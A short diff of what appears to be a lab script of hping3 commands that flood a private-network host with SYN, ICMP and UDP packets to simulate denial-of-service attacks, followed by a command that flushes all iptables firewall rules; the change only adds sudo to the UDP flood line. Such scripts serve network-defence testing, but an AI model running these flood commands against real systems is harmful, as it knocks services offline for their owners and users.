@@ -18,7 +18,7 @@ sudo hping3 -S --flood -p 22 192.168.122.109
 # ICMP Flood (DoS)
 sudo hping3 --icmp --flood -d 1400 192.168.122.109
 # UDP Flood (DoS)
-hping3 --udp --flood 192.168.122.109
+sudo hping3 --udp --flood 192.168.122.109
 
 # Clear iptable
 sudo iptables -F
